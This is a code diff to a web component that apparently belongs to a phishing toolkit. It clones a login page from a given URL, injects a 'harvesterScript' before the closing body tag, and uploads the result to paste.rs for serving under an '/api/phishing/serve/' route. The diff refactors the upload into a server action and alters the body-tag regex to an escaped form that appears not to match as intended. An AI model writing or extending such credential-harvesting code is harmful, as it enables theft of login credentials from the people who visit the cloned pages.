@@ -14,6 +14,7 @@ import { useToast } from '@/hooks/use-toast';
 import { Textarea } from './ui/textarea';
 import { Tabs, TabsContent, TabsList, TabsTrigger } from './ui/tabs';
 import { clonePageFromUrl } from '@/ai/flows/clone-page-from-url-flow';
+import { hostOnPasteRs } from '@/actions/paste-action';
 
 const clonerSchema = z.object({
   redirectUrl: z.string().url({ message: 'Please enter a valid URL for redirection.' }),
@@ -141,7 +142,7 @@ export function LoginPageCloner({ onHostPage }: LoginPageClonerProps) {
         }
 
         html = html.includes('</body>') 
-            ? html.replace(/<\/body>/i, `${harvesterScript}</body>`)
+            ? html.replace(/<\\/body>/i, `${harvesterScript}</body>`)
             : html + harvesterScript;
 
         setModifiedHtml(html);
@@ -161,18 +162,12 @@ export function LoginPageCloner({ onHostPage }: LoginPageClonerProps) {
       toast({ title: "Hosting Page...", description: "Uploading content to secure host." });
 
       try {
-          const pasteResponse = await fetch('https://paste.rs', {
-              method: 'POST',
-              body: modifiedHtml,
-              headers: { 'Content-Type': 'text/html' }
-          });
-          
-          if (!pasteResponse.ok) {
-              throw new Error(`Failed to host page. Service responded with status: ${pasteResponse.status}`);
+          const result = await hostOnPasteRs(modifiedHtml);
+          if (!result.success || !result.pasteId) {
+            throw new Error(result.error || "Failed to get a paste ID from the hosting service.");
           }
           
-          const pasteId = await pasteResponse.text();
-          const hostedUrl = `${window.location.origin}/api/phishing/serve/${pasteId}`;
+          const hostedUrl = `${window.location.origin}/api/phishing/serve/${result.pasteId}`;
           
           onHostPage(hostedUrl);
           
